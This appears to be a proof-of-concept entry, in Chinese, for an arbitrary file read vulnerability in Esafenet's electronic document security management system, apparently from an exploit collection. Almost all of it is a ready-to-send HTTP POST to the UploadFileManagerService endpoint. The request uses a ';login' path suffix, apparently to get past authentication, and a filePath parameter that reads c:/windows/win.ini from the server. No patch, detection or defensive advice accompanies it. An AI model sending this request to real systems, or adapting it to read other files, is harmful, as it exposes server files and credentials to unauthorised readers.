## 亿赛通电子文档安全管理系统-UploadFileManagerService-任意文件读取漏洞

## poc
```
POST /CDGServer3/document/UploadFileManagerService;login HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0

command=ViewUploadFile&filePath=c:/windows/win.ini&fileName1=111111
```
